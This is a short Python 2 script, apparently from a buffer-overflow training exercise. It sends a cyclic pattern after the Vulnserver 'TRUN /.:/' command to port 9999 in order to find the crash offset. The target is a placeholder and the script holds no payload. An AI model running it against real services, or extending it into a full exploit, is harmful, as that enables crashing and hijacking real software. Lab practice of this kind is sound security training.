 #!/usr/bin/python2
        import sys, socket

        # Change IP and Port on line 13 to Target and Port Application is running on
        # Change TRUN on line 14 to Command you are testing
        # Paste Pattern Created into line 8

        offset = ""
        
        try:
            print "\nLocating Offset..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + offset))
            s.close()
  
        except:            
            print "\nError Connecting to Server"
            sys.exit()
